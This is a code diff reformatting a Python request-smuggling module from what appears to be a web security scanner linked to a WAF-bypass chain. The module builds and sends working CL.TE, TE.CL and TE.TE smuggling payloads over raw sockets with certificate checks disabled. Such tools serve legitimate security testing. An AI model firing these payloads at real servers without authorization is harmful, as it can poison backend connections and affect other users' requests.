@@ -10,7 +10,6 @@ Integrates with the WAF bypass chain for smuggling past WAFs to hit backends.
 import socket
 import ssl
 import time
-import re
 
 from config import Colors
 
@@ -25,14 +24,14 @@ class RequestSmugglingModule:
     def __init__(self, engine):
         self.engine = engine
         self.requester = engine.requester
-        self.verbose = engine.config.get('verbose', False)
-        self.timeout = engine.config.get('timeout', 10)
+        self.verbose = engine.config.get("verbose", False)
+        self.timeout = engine.config.get("timeout", 10)
 
     # ------------------------------------------------------------------
     # Public API
     # ------------------------------------------------------------------
 
-    def test(self, url: str, method: str = 'POST', param: str = '', value: str = '') -> None:
+    def test(self, url: str, method: str = "POST", param: str = "", value: str = "") -> None:
         """Run all request smuggling checks against the target."""
         self.test_url(url)
 
@@ -67,11 +66,7 @@ class RequestSmugglingModule:
         smuggled portion, the *next* normal request will be poisoned.
         """
         smuggled_prefix = "G]"  # invalid method → triggers 405/400 on backend
-        body = (
-            "0\r\n"
-            "\r\n"
-            f"{smuggled_prefix}"
-        )
+        body = "0\r\n" "\r\n" f"{smuggled_prefix}"
         # CL = length of "0\r\n\r\n" only (the front-end stops here)
         cl = len("0\r\n\r\n")
 
@@ -86,18 +81,13 @@ class RequestSmugglingModule:
         )
 
         try:
-            resp1 = self._raw_send(host, port, raw.encode(), use_ssl)
+            self._raw_send(host, port, raw.encode(), use_ssl)
             # Now send a normal request; if poisoned the server sees "G] …"
-            normal = (
-                f"GET {path} HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"Connection: close\r\n"
-                f"\r\n"
-            )
+            normal = f"GET {path} HTTP/1.1\r\n" f"Host: {host}\r\n" f"Connection: close\r\n" f"\r\n"
             resp2 = self._raw_send(host, port, normal.encode(), use_ssl)
 
             if resp2 and self._is_poisoned(resp2):
-                self._add_finding(url, 'CL.TE', raw, resp2)
+                self._add_finding(url, "CL.TE", raw, resp2)
         except Exception:
             pass
 
@@ -108,13 +98,7 @@ class RequestSmugglingModule:
     def _test_te_cl(self, host, port, path, use_ssl, url):
         """Detect TE.CL smuggling."""
         # Smuggled body after chunk terminator that back-end reads via CL
-        smuggled = (
-            f"POST {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Content-Length: 10\r\n"
-            f"\r\n"
-            f"x=1"
-        )
+        smuggled = f"POST {path} HTTP/1.1\r\n" f"Host: {host}\r\n" f"Content-Length: 10\r\n" f"\r\n" f"x=1"
         chunk_data = smuggled.encode()
         chunk_line = f"{len(chunk_data):x}\r\n".encode()
 
@@ -132,9 +116,12 @@ class RequestSmugglingModule:
 
         try:
             resp = self._raw_send(host, port, raw, use_ssl)
-            if resp and (b'HTTP/1.1 400' in resp or b'HTTP/1.1 405' in resp
-                         or self._is_timeout_differential(host, port, path, use_ssl)):
-                self._add_finding(url, 'TE.CL', raw.decode(errors='replace'), resp)
+            if resp and (
+                b"HTTP/1.1 400" in resp
+                or b"HTTP/1.1 405" in resp
+                or self._is_timeout_differential(host, port, path, use_ssl)
+            ):
+                self._add_finding(url, "TE.CL", raw.decode(errors="replace"), resp)
         except Exception:
             pass
 
@@ -167,9 +154,8 @@ class RequestSmugglingModule:
             )
             try:
                 resp = self._raw_send(host, port, raw.encode(), use_ssl)
-                if resp and b'SMUGGLED' in resp:
-                    self._add_finding(url, f'TE.TE ({te_variant.split(chr(13))[0]})',
-                                      raw, resp)
+                if resp and b"SMUGGLED" in resp:
+                    self._add_finding(url, f"TE.TE ({te_variant.split(chr(13))[0]})", raw, resp)
                     break  # one proof is enough
             except Exception:
                 continue
@@ -183,13 +169,14 @@ class RequestSmugglingModule:
         """Extract host, port, path, use_ssl from *url*."""
         try:
             from urllib.parse import urlparse
+
             p = urlparse(url)
-            use_ssl = p.scheme == 'https'
-            host = p.hostname or ''
+            use_ssl = p.scheme == "https"
+            host = p.hostname or ""
             port = p.port or (443 if use_ssl else 80)
-            path = p.path or '/'
+            path = p.path or "/"
             if p.query:
-                path += f'?{p.query}'
+                path += f"?{p.query}"
             return host, port, path, use_ssl
         except Exception:
             return None, None, None, None
@@ -207,7 +194,7 @@ class RequestSmugglingModule:
                 ctx.verify_mode = ssl.CERT_NONE
                 sock = ctx.wrap_socket(sock, server_hostname=host)
             sock.sendall(data)
-            resp = b''
+            resp = b""
             while True:
                 try:
                     chunk = sock.recv(4096)
@@ -229,24 +216,23 @@ class RequestSmugglingModule:
     def _is_poisoned(resp):
         """Heuristic: the follow-up response shows signs of smuggling."""
         if isinstance(resp, bytes):
-            resp_str = resp.decode(errors='replace')
+            resp_str = resp.decode(errors="replace")
         else:
             resp_str = resp
         indicators = [
-            'HTTP/1.1 405', 'HTTP/1.1 400', 'HTTP/1.0 400',
-            'Unrecognized method', 'Invalid request',
-            'Bad Request', 'Method Not Allowed',
+            "HTTP/1.1 405",
+            "HTTP/1.1 400",
+            "HTTP/1.0 400",
+            "Unrecognized method",
+            "Invalid request",
+            "Bad Request",
+            "Method Not Allowed",
         ]
         return any(ind in resp_str for ind in indicators)
 
     def _is_timeout_differential(self, host, port, path, use_ssl):
         """Check if a normal GET now hangs (queued smuggled request)."""
-        normal = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Connection: close\r\n"
-            f"\r\n"
-        )
+        normal = f"GET {path} HTTP/1.1\r\n" f"Host: {host}\r\n" f"Connection: close\r\n" f"\r\n"
         start = time.time()
         self._raw_send(host, port, normal.encode(), use_ssl, timeout=5)
         elapsed = time.time() - start
@@ -256,21 +242,22 @@ class RequestSmugglingModule:
         """Register a confirmed smuggling finding."""
         try:
             from core.engine import Finding
-            resp_preview = ''
+
+            resp_preview = ""
             if raw_response:
                 if isinstance(raw_response, bytes):
-                    resp_preview = raw_response[:500].decode(errors='replace')
+                    resp_preview = raw_response[:500].decode(errors="replace")
                 else:
                     resp_preview = str(raw_response)[:500]
 
             finding = Finding(
-                technique=f'HTTP Request Smuggling ({variant})',
+                technique=f"HTTP Request Smuggling ({variant})",
                 url=url,
-                method='POST',
-                param='',
+                method="POST",
+                param="",
                 payload=str(raw_request)[:300] if raw_request else variant,
                 evidence=resp_preview,
-                severity='CRITICAL',
+                severity="CRITICAL",
                 confidence=0.75,
             )
             self.engine.add_finding(finding)
